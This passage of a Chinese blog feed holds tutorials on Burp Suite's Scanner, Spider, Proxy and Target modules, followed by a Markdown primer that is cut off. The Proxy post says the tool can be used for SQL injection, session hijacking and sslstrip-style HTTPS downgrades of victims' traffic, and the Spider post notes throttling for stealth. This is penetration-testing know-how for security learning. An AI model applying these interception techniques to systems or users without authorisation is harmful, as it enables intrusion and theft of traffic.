        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>BurpSuite系列之Scanner模块(漏洞扫描)<br><a id="more"></a></p><p>一、简介<br>Burp Scanner 是一个进行自动发现 web 应用程序的安全漏洞的工具。它是为渗透测试人员设计的，并且它和你现有的手动执行进行的 web 应用程序半自动渗透测试的技术方法很相似。<br>使用的大多数的 web 扫描器都是单独运行的：你提供了一个开始 URL，单击‖go‖,然后注视着进度条的更新直到扫描结束，最后产生一个报告。Burp Scanner 和这完全不同，在攻击一个应用程序时它和你执行的操作紧紧的结合在一起。让你细微控制着每一个扫描的请求，并直接反馈回结果。<br>Burp Scanner 可以执行两种扫描类型：主动扫描(Active scanning)，被动扫描(Passive scanning)。<br>二、模块说明<br>1：Issue activity</p><p> <img src="http://poysl5u4h.bkt.clouddn.com/20190326164950/20190326045400722.png" alt><br>2：Scan queue  扫描队列，这里将显示扫描队列的状态 进度 结果等。<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164950/20190326045411253.png" alt></p><p>主要包含以下内容：</p><ol><li>索引号的项目，反映该项目的添加顺序。</li><li>目的地协议，主机和URL 。</li><li>该项目的当前状态，包括完成百分比。</li><li>项目扫描问题的数量（这是根据所附的最严重问题的重要性和彩色化） 。</li><li>在扫描项目的请求数量进行。</li><li>网络错误的数目遇到的问题。</li><li>为项目创建的插入点的数量。</li></ol><p>3：Live scanning<br>实时扫描可让您决定哪些内容通过使用浏览器的目标应用，通过BurpProxy服务器进行扫描。您可以实时主动扫描设定live active scanning(积极扫描)和live passive（被动扫描）两种扫描模式。<br>Live Active Scanning：积极扫描。当浏览时自动发送漏洞利用代码。<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164950/20190326045424075.png" alt></p><p>Live Passive Scanning：被动扫描。只分析流量不发送任何请求。<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164950/20190326045429074.png" alt></p><p>3：Issue Definitions<br>漏洞列表，列出了burp可以扫描到的漏洞详情<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164950/20190326045434255.png" alt></p><p>4：Options<br>包含Burp扫描选项进行攻击的插入点，主动扫描引擎，主动扫描优化，主动扫描区和被动扫描区域。<br>1：Attack Insertion Points<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164950/20190326045439303.png" alt></p><p>2：Active Scanning Engine<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164950/20190326045445120.png" alt></p><p>3：Active Scanning Optimization<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164950/20190326045448834.png" alt></p><p>4：Active Scanning Areas<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164950/20190326045454641.png" alt></p><p>5：Passive Scanning Areas<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164950/20190326045458043.png" alt></p><p>6：Static Code Analysis<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164950/20190326045504023.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安装与使用 </category>
          
          <category> Burpsuite </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite之Spider模块</title>
      <link href="/2018/03/26/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BSpider%E6%A8%A1%E5%9D%97/"/>
      <url>/2018/03/26/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BSpider%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>BurpSuite之Spider模块(蜘蛛爬行)</p><a id="more"></a><p>一、简介<br>Burp Spider 是一个映射 web 应用程序的工具。它使用多种智能技术对一个应用程序的内容和功能进行全面的清查。<br>Burp Spider 通过跟踪 HTML 和 JavaScript 以及提交的表单中的超链接来映射目标应用程序，它还使用了一些其他的线索，如目录列表，资源类型的注释，以及 robots.txt 文件。结果会在站点地图中以树和表的形式显示出来，提供了一个清楚并非常详细的目标应用程序视图。<br>Burp Spider 能使你清楚地了解到一个 web 应用程序是怎样工作的，让你避免进行大量的手动任务而浪费时间，在跟踪链接，提交表单，精简 HTNL 源代码。可以快速地确人应用程序的潜在的脆弱功能，还允许你指定特定的漏洞，如 SQL 注入，路径遍历。<br>二、模块介绍<br>要对应用程序使用 Burp Spider 需要两个简单的步骤：<br>1.使用 Burp Proxy 配置为你浏览器的代理服务器，浏览目标应用程序(为了节省时间，你可以关闭代理拦截)。</p><p>2.到站点地图的”arget”选项上，选中目标应用程序驻留的主机和目录。选择上下文菜单的”<br>spider this host/branc”选项。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/20190326164000/20190326044124622.png" alt></p><p>选项一、Contro<br>用来开始和停止 Burp Spider，监视它的进度，以及定义 spidering 的范围。<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164000/20190326044209596.png" alt><br>选项二、Options<br>这个选项里包含了许多控制 Burp Spider 动作的选项。<br>1：Crawler Settings<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164000/20190326044216519.png" alt><br>● check robots.txt：检测robot.txt文件。选择后Burp Spider会要求和处理robots.txt文件，提取内容链接。<br>● Detect custom “not found” responese：检测自定义的’not found’响应。打开后Burp Spider会从每个域请求不存在的资源，编制指纹与诊断“not found”响应其它请求检测自定义“not found”的响应。<br>● ignore links to non-text content：忽略非文本内容的连接。这个选项被选中，Spider 不会请求非文本资源。使用这个选项，会减少 spidering 时间。<br>● request the root of all directories：请求所有的根目录。如果这个选项被选中，Burp Spider 会请求所有已确认的目标范围内的 web 目录，如果在这个目标站点存在目录遍历， 这选项将是非常的有用。<br>● make a non-parameterized request to each dynamic page：对每个动态页面进行非参数化的请求。如果这个选项被选中，Burp Spider 会对在范围内的所有执行动作的 URL 进行无参数的 GET 请求。如果期待的参数没有被接收， 动态页面会有不同的响应，这个选项就能成功地探测出额外的站点内容和功能。<br>● Maximum link depth：这是Burp Suite在种子 URL 里的浏览”hops”的最大数。0表示让Burp Suite只请求种子 URL。如果指定的数值非常大，将会对范围内的链接进行无限期的有效跟踪。将此选项设置为一个合理的数字可以帮助防止循环Spider在某些种类的动态生成的内容。<br>● Maximum parameterized requests per URL：请求该蜘蛛用不同的参数相同的基本URL的最大数目。将此选项设置为一个合理的数字可以帮助避免爬行“无限”的内容。<br>2：Passive Spidering<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164000/20190326044225919.png" alt><br>● Passively spider as you browse:如果这个选项被选中，Burp Suite 会被动地处理所有通过 Burp Proxy 的 HTTP 请求，来确认访问页面上的链接和表格。使用这个选项能让 Burp Spider 建立一个包含应用程序内容的详细画面，甚至此时你仅仅使用浏览器浏览了内容的一个子集，因为所有被访问内容链接到内容都会自动地添加到 Suite 的站点地图上。<br>● link depth to associate with proxy requests:这个选项控制着与通过 Burp Proxy 访问的 web 页面 有关的” link depth”。为了防止 Burp Spider 跟踪这个页面里的所有链接，要设置一个比上面 选项卡里的” maximum link depth”值还高的一个值。<br>3：Form Submission<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164000/20190326044233259.png" alt><br>● individuate forms：个性化的形式。这个选项是配置个性化的标准(执行 URL，方法，区域，值)。当 Burp Spider 处理这些表格时，它会检查这些标准以确认表格是否是新的。旧的表格不会加入到提交序列。<br>● Don’t submit：开启后蜘蛛不会提交任何表单。<br>● prompt for guidance：提醒向导。如果被选中，在你提交每一个确认的表单前，Burp Suite 都会为你指示引导。这允许你根据需要在输入域中填写自定义的数据，以及选项提交到服务器的哪一个区域。<br>● automatically submit：自动提交。如果选中，Burp Spider 通过使用定义的规则来填写输入域的文本值来自动地提交范围内的表单。每一条规则让你指定一个简单的文本或者正则表达式来匹配表单字段名，并提交那些表单名匹配的字段值。<br>● set unmatched fields to：设置不匹配的字段。<br>4：application login<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164000/20190326044239593.png" alt><br>● don’t submit login forms：不提交登录表单。开启后burp不会提交登录表单。<br>● prompt for guidance：提示向导。Burp能交互地为你提示引导。默认设置项。<br>● handle as ordinary forms：以一般形式处理。Burp 通过你配置的信息和自动填充规则，用处理其他表单的方式来处理登陆表单。<br>● automatically submit these credentials：自动提交自定义的数据。开启后burp遇到登录表单会按照设定的值进行提交。<br>5：Spider Engine<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164000/20190326044246271.png" alt><br>● Number of threads – 设置请求线程。控制并发请求数。<br>● Number of retries on network failure – 如果出现连接错误或其他网络问题，Burp会放弃和移动之前重试的请求指定的次数。测试时间歇性网络故障是常见的，所以最好是在发生故障时重试该请求了好几次。<br>● Pause before retry – 当重试失败的请求，Burp会等待指定的时间（以毫秒为单位）以下，然后重试失败。如果服务器宕机，繁忙，或间歇性的问题发生，最好是等待很短的时间，然后重试。<br>● Throttle between requests：在每次请求之前等待一个指定的延迟（以毫秒为单位）。此选项很有用，以避免超载应用程序，或者是更隐蔽。<br>● Add random variations to throttle：添加随机的变化到请求中。增加隐蔽性。<br>6：Request Headers<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164000/20190326044253928.png" alt><br>您可以配置头蜘蛛在请求中使用的自定义列表。这可能是有用的，以满足各个应用程序的特定要求 – 例如，测试设计用于移动设备的应用程序时，以模拟预期的用户代理。</p><p>● Use HTTP version 1.1 ：在蜘蛛请求中使用HTTP/1.1，不选中则使用HTTP/1.0.<br>● Use Referer header：当从一个页面访问另一个页面是加入Referer头，这将更加相似与浏览器访问。</p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安装与使用 </category>
          
          <category> Burpsuite </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite系列之Proxy模块</title>
      <link href="/2018/03/01/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BProxy%E6%A8%A1%E5%9D%97/"/>
      <url>/2018/03/01/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BProxy%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<p>BurpSuite系列之Proxy模块(代理模块) </p><a id="more"></a><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Proxy代理模块作为BurpSuite的核心功能，拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。</p><p>Burp代理允许你通过监视和操纵应用程序传输的关键参数和其他数据来查找和探索应用程序的漏洞。通过以恶意的方式修改浏览器的请求，Burp 代理可以用来进行攻击，如：SQL 注入，cookie欺骗，提升权限，会话劫持，目录遍历，缓冲区溢出。拦截的传输可以被修改成原始文本，也可以是包含参数或者消息头的表格，也可以十六进制形式，甚至可以操纵二进制形式的数据。在 Burp 代理可以呈现出包含 HTML 或者图像数据的响应消息。</p><h1 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h1><h2 id="Intercept"><a href="#Intercept" class="headerlink" title="Intercept"></a>Intercept</h2><p>用于显示和修改HTTP请求和响应，通过你的浏览器和Web服务器之间。在BurpProxy的选项中，您可以配置拦截规则来确定请求是什么和响应被拦截(例如，范围内的项目，与特定文件扩展名，项目要求与参数，等)。该面板还包含以下控制：</p><p><img src="1.png" alt></p><p>消息类型显示的四种格式</p><p><img src="2.png" alt></p><p>raw：这里显示的是纯文本形式的消息。在文本窗口的底部提供了一个搜索和加亮功能，可以用它来快速地定位出消息中的感兴趣的字符串，如错误消息。在搜索的左边有一个弹出项，让你来处理大小写问题，以及是使用简单的文本搜索还是正则表达搜索。</p><p>params：对包含参数(URL 查询字符串，cookies 消息头，或消息体)的请求，这个选项可以把参数分析成名称/值的组合，并且允许你能简单地查看和修改。</p><p>headers：这里以名称/值的组合来显示 HTTP 的消息头，并且还以原始的形式显示消息体。</p><p>hex：这里允许你直接编辑消息的原始二进制数据。如果在文本编辑器里修改，某些传输类型(例如，使用 MIME 编码的浏览器请求的部分)包含的二进制数据可能被损坏。为了修改这些类型的消息，应使用十六进制。</p><h3 id="Forward"><a href="#Forward" class="headerlink" title="Forward"></a>Forward</h3><p>当你编辑信息之后，发送信息到服务器或浏览器</p><h3 id="Drop"><a href="#Drop" class="headerlink" title="Drop"></a>Drop</h3><p>当你不想要发送这次信息可以点击drop放弃这个拦截信息</p><h3 id="Interceptionis-on-off"><a href="#Interceptionis-on-off" class="headerlink" title="Interceptionis on/off"></a>Interceptionis on/off</h3><p>这个按钮用来切换和关闭所有拦截。如果按钮显示Interceptionis On，表示请求和响应将被拦截或自动转发根据配置的拦截规则配置代理选项。如果按钮显示Interception is off则显示拦截之后的所有信息将自动转发。</p><h3 id="Action"><a href="#Action" class="headerlink" title="Action"></a>Action</h3><p>说明一个菜单可用的动作行为操作可以有哪些操作功能。</p><p><img src="3.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Send to Spider          发送给蜘蛛</span><br><span class="line">Do an active scan       执行主动扫描</span><br><span class="line">Send to Intruder        发送到入侵者</span><br><span class="line">Send to Repeater        发送到中继器</span><br><span class="line">Send to Sequencer       发送到序列发生器</span><br><span class="line">Send to Comparer        发送到比较器</span><br><span class="line">Send to Decoder         发送到解码器</span><br><span class="line">Request in browser      在浏览器的请求</span><br><span class="line">Engagement tools        参与工具</span><br></pre></td></tr></table></figure><p>1.Change request method  </p><p>对所有的请求，经过把所有相关的请求参数适当地搬迁到这个请求里来，你就可以自动地把请求的方法在 POST 和 GET 中间切换。通过发送恶意的请求使用这个选项来快速测试应用程序的极限参数是多少。</p><p>2.Change body encoding  </p><p>对于所有的请求，你可以在应用程序/X-WWW 格式的 URL 编码和多重表单/数据之间切换消息体的编码方式。</p><p>3.Copy URL       </p><p>把当前的 URL 完整地复制到粘贴板上。</p><p>4.Cope as curl command  </p><p>作为curl命令</p><p>5.Cope to file </p><p>这个功能允许你把选择一个文件，并把消息的内容复制到这个文件里。这个对二进制数据来说是很方便的，要是通过粘贴板来复制会带来一些问题。复制操作是在选择的文本上进行的，如果没有被选中的内容，则是针对整个消息了。</p><p>6.Pase form file </p><p>这个功能允许你选择一个文件，并把文件里的内容粘贴到消息里。这个对二进制数据来说是很方便的，要是通过粘贴板来复制会带来一些问题。粘贴操作会替换掉被选中的内容，如果没有内容被选中，则在光标位置插入这些内容。</p><p>7.Save item</p><p>这个功能让你指定一个文件，把选中的请求和响应以XML的格式保存到这个文件，这里面包括所有的元数据如：响应的长度，HTTP 的状态码以及 MIME 类型。</p><p>8.Don’t intercept requests   </p><p>通过这些命令可以快速地添加拦截动作的规则来阻止拦截到的消息，这些消息和当前的消息有着相同的特征(如远程主机，资源类型，响应编码)。</p><p>9.Do intercept                           </p><p>仅对请求有效，这允许你可以对当请求和响应的进行强制拦截。</p><p>10.Convert seiection                 </p><p>这些功能让你能够以多种方案对选择的文本进行快速的编码和解码。<br>11URL-encode as you type   </p><p>如果这个选项被打开，你输入的像&amp;和=这样的符号会被等价的 URL编码代替。</p><p>Cut                           剪切<br>Copy                          复制<br>Paste                         粘贴<br>Message edit help             消息编辑帮助<br>Proxy interception help       代理拦截帮助</p><h2 id="HTTP-History"><a href="#HTTP-History" class="headerlink" title="HTTP History"></a>HTTP History</h2><p>这个选项是来显示所有请求产生的细节，显示的有目标服务器和端口，HTTP 方法，URL，以及请求中是否包含参数或被人工修改，HTTP 的响应状态码，响应字节大小，响应的 MIME类型，请求资源的文件类型，HTML 页面的标题，是否使用 SSL，远程 IP 地址，服务器设置的 cookies，请求的时间。</p><p><img src="4.png" alt></p><p>双击某个请求即可打开详情,通过Previous/next可以快速切换请求，并且Action也可以将请求发送至其他模块。</p><p><img src="5.png" alt></p><p>可以通过最左边的列里的下拉菜单来加亮单个选项：</p><p><img src="6.png" alt></p><p>在历史记录表里，右击一个或多个选项，就会显示一个上下文菜单让你执行一些操作，包括修改目标范围，把这些选项发送到其他 Burp 工具，或者删除这些项：</p><p><img src="7.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Add to scope                   添加范围</span><br><span class="line">Spide from here                蜘蛛从当前地址开始</span><br><span class="line">Do an active scan              执行主动扫描</span><br><span class="line">Do a passive scan              做被动扫描</span><br><span class="line">Send to Intruder               发送到入侵者</span><br><span class="line">Send to Repeater               发送到中继器</span><br><span class="line">Send to Sequencer              发送到序列生成器</span><br><span class="line">Send to Comparer(request)      发送到比较器（请求）</span><br><span class="line">Send to Comparer(response)     发送到比较器（响应）</span><br><span class="line">Show response in browser       在浏览器中显示响应</span><br><span class="line">Request in browser             浏览请求</span><br><span class="line">Engagement tools               接合工具</span><br><span class="line">Show new History windows       显示新的历史窗口</span><br><span class="line">Add comment                    添加评论</span><br><span class="line">Highlight                      高亮部分</span><br><span class="line">Delete item                    删除项目</span><br><span class="line">Clear history                  清除历史记录</span><br><span class="line">Copy URL                       复制网址</span><br><span class="line">Copy as curl command           复制为curl命令</span><br><span class="line">Copy links                     复制链接</span><br><span class="line">Save item                      保存项目</span><br><span class="line">Proxy history help             代理历史帮助</span><br></pre></td></tr></table></figure><p>还可以通过配置过滤器来确定哪些顶层的数据项显示在表格里。有效应用程序包含了大量的内容，如图像，CSS 等，这些有利于从视图上隐藏的。AJAX 应用程序产生大量相似的异步请求，你可能会想把他们从视图上过滤出来来查看一些感兴趣的项。在这个历史记录表的顶部有一个过滤栏。单击会有一个弹出窗口，让你来精准地配置显示哪些内容在表格里：</p><p><img src="8.png" alt></p><h2 id="WebSockets-history"><a href="#WebSockets-history" class="headerlink" title="WebSockets history"></a>WebSockets history</h2><p>这个选项主要用于记录WebSockets的数据包，是HTML5中最强大的通信功能，定义了一个全双工的通信信道，只需Web上的一个 Socket即可进行通信，能减少不必要的网络流量并降低网络延迟。</p><p><img src="9.png" alt></p><h2 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h2><p>该选项主要用于设置代理监听、请求和响应，拦截反应，匹配和替换，ssl等，其中有八大选项:Proxy Listeners、Intercept Client Requests、Intercept Server Responses、Intercept WebSockets Messages、Response Modification、Match and replace、SSL Pass Through、Miscellaneous</p><h3 id="Proxy-Listeners"><a href="#Proxy-Listeners" class="headerlink" title="Proxy Listeners"></a>Proxy Listeners</h3><p><img src="10.png" alt></p><p>代理侦听器是侦听从您的浏览器传入的连接本地HTTP代理服务器。它允许您监视和拦截所有的请求和响应，并且位于BurpProxy的工作流的心脏。默认情况下，Burp默认监听12.0.0.1地址，端口8080。要使用这个监听器，你需要配置你的浏览器使用127.0.0.1:8080作为代理服务器。此默认监听器是必需的测试几乎所有的基于浏览器的所有Web应用程序。</p><p>1.add：添加一个新的代理地址。</p><p>   1.binding：新建一个代理，bind to port-绑定端口号 ，bind to address -绑定ip地址</p><p>   <img src="11.png" alt></p><p>   2.request hadning:这些设置包括选项来控制是否BurpSuite重定向通过此侦听器接收到的请求：</p><pre><code>2.1.Redirect to host如果配置了这个选项，Burp会在每次请求转发到指定的主机，而不必受限于览器所请求的目标。需要注意的是，如果你正使用该选项，则可能需要配置匹配/替换规则重写的主机中的请求，如果服务器中，您重定向请求预期，不同于由浏览器发送一个主机头。2.2.Redirect to port 如果配置了这个选项，Burp会在每次请求转发到指定的端口，而不必受限于浏览2.3.Force use of SSL 如果配置了这个选项，Burp会使用HTTPS在所有向外的连接，即使传入的请求中使用普通的HTTP。您可以使用此选项，在与SSL相关的响应修改选项结合，开展sslstrip般的攻击使用Burp，其中，强制执行HTTPS的应用程序可以降级为普通的HTTP的受害用户的流量在不知不觉中通过BurpProxy代理。![](12.png)</code></pre><p>   3.Certificate:这些设置控制呈现给客户端的SSL服务器的SSL证书。</p><pre><code>3.1.Generate CA-signed per-host certificate-这是默认选项。安装后，BurpSuite创造了一个独特的自签名的证书颁发机构（CA）证书，并将此计算机上使用，每次BurpSuite运行。当你的浏览器发出SSL连接到指定的主机，Burp产生该主机，通过CA证书签名的SSL证书。您可以安装BurpSuite的CA证书作为在浏览器中受信任的根，从而使每个主机的证书被接受，没有任何警报。您还可以导出其他工具或Burp的其他实例使用CA证书。3.2.Generate a CA-signed certificate with a specific hostname---||这类似于前面的选项;然而，Burp会产生一个单一的主机证书与每一个SSL连接使用，使用您指定的主机名。在进行无形的代理时，此选项有时是必要的，因为客户端没有发送连接请求，因此Burp不能确定SSL协议所需的主机名。你也可以安装BurpSuite的CA证书作为受信任的根。3.3.Use a custom certificate---||-此选项使您可以加载一个特定的证书（在PKCS＃12格式）呈现给你的浏览器。如果应用程序使用它需要特定的服务器证书（例如一个给定序列号或证书链）的客户端应该使用这个选项。![](13.png)</code></pre><p>2.edit：编辑选中的代理地址。</p><p>3.remove：删除选中代理地址。</p><h3 id="Intercept-Client-Requests"><a href="#Intercept-Client-Requests" class="headerlink" title="Intercept Client Requests"></a>Intercept Client Requests</h3><p>配置拦截规则，设置拦截的匹配规则。 当Intercept request based on the following rules为选中状态时，burpsuite会配置列表中的规则进行拦截或转发。</p><p>注意：如果该复选框未选中，那么即使Intercept is on也无法截取数据包。</p><p>规则可以通过Enabled列中的复选框选择开启或关闭。<br>规则可以是域名， IP地址，协议， HTTP方法， URL，文件扩展名，参数，cookie，头/主体内容，状态代码，MIME类型， HTML页面标题等。<br>规则按顺序处理，并且使用布尔运算符AND和OR组合。</p><h3 id="Intercept-Server-Responses"><a href="#Intercept-Server-Responses" class="headerlink" title="Intercept Server Responses"></a>Intercept Server Responses</h3><p>配置拦截规则，设置拦截的匹配规则，不过这个选项是基于服务端拦截，当选小的Intercept request based on the following rules为选中状态时，burpsuite会匹配响应包。</p><h3 id="Intercept-WebSockets-Messages"><a href="#Intercept-WebSockets-Messages" class="headerlink" title="Intercept WebSockets Messages"></a>Intercept WebSockets Messages</h3><h3 id="Response-Modification"><a href="#Response-Modification" class="headerlink" title="Response Modification"></a>Response Modification</h3><p><img src="14.png" alt></p><p><img src="14_1.png" alt></p><h3 id="Match-and-replace"><a href="#Match-and-replace" class="headerlink" title="Match and replace"></a>Match and replace</h3><p>用于自动替换请求和响应通过代理的部分。对于每一个HTTP消息，已启用的匹配和替换规则依次执行，选择适用的规则进行匹配执行。<br>规则可以分别被定义为请求和响应，对于消息头和身体，并且还特别为只请求的第一行。每个规则可以指定一个文字字符串或正则表达式来匹配，和一个字符串来替换它。对于邮件头，如果匹配条件，整个头和替换字符串匹配留空，然后头被删除。如果指定一个空的匹配表达式，然后替换字符串将被添加为一个新的头。有可协助常见任务的各种缺省规则 - 这些都是默认为禁用。 匹配多行区域。您可以使用标准的正则表达式语法来匹配邮件正文的多行区域。</p><h3 id="SSL-Pass-Through"><a href="#SSL-Pass-Through" class="headerlink" title="SSL Pass Through"></a>SSL Pass Through</h3><p><img src="15.png" alt></p><h3 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h3><p><img src="16.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安装与使用 </category>
          
          <category> Burpsuite </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite系列之Target模块</title>
      <link href="/2018/02/12/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BTarget%E6%A8%A1%E5%9D%97/"/>
      <url>/2018/02/12/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BTarget%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<p>BurpSuite系列之Target模块</p><a id="more"></a><h1 id="Target功能"><a href="#Target功能" class="headerlink" title="Target功能"></a>Target功能</h1><p>目标工具包含了SiteMap，用你的目标应用程序的详细信息。它可以让你定义哪些对象在范围上为你目前的工作，也可以让你手动测试漏洞的过程。<br>Target分为site map和scope两个选项卡。</p><h3 id="选项一：Site-Map"><a href="#选项一：Site-Map" class="headerlink" title="选项一：Site Map"></a>选项一：Site Map</h3><p>SiteMap会在目标中以树形和表形式显示，并且还可以查看完整的请求和响应。树视图包含内容的分层表示，随着细分为地址，目录，文件和参数化请 求的URL 。您还可以扩大有趣的分支才能看到进一步的细节。如果您选择树的一个或多个部分，在所有子分支所选择的项目和项目都显示在表视图。</p><p>该表视图显示有关每个项目（URL ， HTTP状态代码，网页标题等）的关键细节。您可以根据任意列进行排序表（单击列标题来循环升序排序，降序排序，和未排序） 如果您在表中选择一个项目，请求和响应（如适用）该项目显示在请求/响应窗格。这包含了请求和响应的HTTP报文的编辑器，提供每封邮件的详细分析。</p><p>站点地图汇总所有的信息BurpSuite已经收集到的有关申请。这包括：</p><p>所有这一切都通过代理服务器直接请求的资源。已推断出通过分析响应代理请求的任何物品（前提是你没有禁用被动Spider）。<br>内容使用Spider或内容发现功能查找。由用户手动添加的任何项目，从其它工具的输出。</p><p><img src="1.png" alt></p><p>这样看起来site map是不是很乱，则可以右击add to scope，然后点击Filter勾选Show only in-scope items，此时你再回头看Site map就只有百度一个地址了，这里filter可以过滤一些参数，show all显示全部，hide隐藏所有，如果勾选了表示不过滤。</p><p><img src="2.png" alt></p><p><img src="3.png" alt></p><p>选择之后就只剩下一个网址了</p><p><img src="4.png" alt></p><p>针对地址右击显示当前可以做的一些动作操作等功能。</p><p><img src="5.png" alt></p><h3 id="选项二：Scope"><a href="#选项二：Scope" class="headerlink" title="选项二：Scope"></a>选项二：Scope</h3><p>这个主要是配合Site map做一些过滤的功能</p><p><img src="6.png" alt></p><p>已请求在SiteMap中的项目会显示为黑色。尚未被请求的项目显示为灰色</p><p><img src="7.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安装与使用 </category>
          
          <category> Burpsuite </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown基本用法</title>
      <link href="/2018/02/08/Markdown%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/"/>
      <url>/2018/02/08/Markdown%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>Markdown基本语法</p><a id="more"></a><p>Markdown是一种纯文本格式的标记语言。通过简单的标记语法，它可以使普通文本内容具有一定的格式。<br>相比WYSIWYG编辑器</p><p><strong>优点</strong></p><p>1、因为是纯文本，所以只要支持Markdown的地方都能获得一样的编辑效果，可以让作者摆脱排版的困扰，专心写作。<br>2、操作简单。比如:WYSIWYG编辑时标记个标题，先选中内容，再点击导航栏的标题按钮，选择几级标题。<br>要三个步骤。而Markdown只需要在标题内容前加#即可</p><p><strong>缺点</strong></p><p>1、需要记一些语法（当然，是很简单。五分钟学会）。<br>2、有些平台不支持Markdown编辑模式。<br>还好，简书是支持Markdown编辑模式的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">开启方式：设置-&gt;默认编辑器-&gt;Markdown编辑器</span><br></pre></td></tr></table></figure><h1 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h1><p>在想要设置为标题的文字前面加#来表示<br>一个#是一级标题，二个#是二级标题，以此类推。支持六级标题。<br>注：标准语法一般在#后跟个空格再写文字，貌似简书不加空格也行。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 这是一级标题</span><br><span class="line">## 这是二级标题</span><br><span class="line">### 这是三级标题</span><br><span class="line">#### 这是四级标题</span><br><span class="line">##### 这是五级标题</span><br><span class="line">###### 这是六级标题</span><br></pre></td></tr></table></figure><p>效果如下：</p><h1 id="这是一级标题"><a href="#这是一级标题" class="headerlink" title="这是一级标题"></a>这是一级标题</h1><h2 id="这是二级标题"><a href="#这是二级标题" class="headerlink" title="这是二级标题"></a>这是二级标题</h2><h3 id="这是三级标题"><a href="#这是三级标题" class="headerlink" title="这是三级标题"></a>这是三级标题</h3><h4 id="这是四级标题"><a href="#这是四级标题" class="headerlink" title="这是四级标题"></a>这是四级标题</h4><h5 id="这是五级标题"><a href="#这是五级标题" class="headerlink" title="这是五级标题"></a>这是五级标题</h5><h6 id="这是六级标题"><a href="#这是六级标题" class="headerlink" title="这是六级标题"></a>这是六级标题</h6><h1 id="字体"><a href="#字体" class="headerlink" 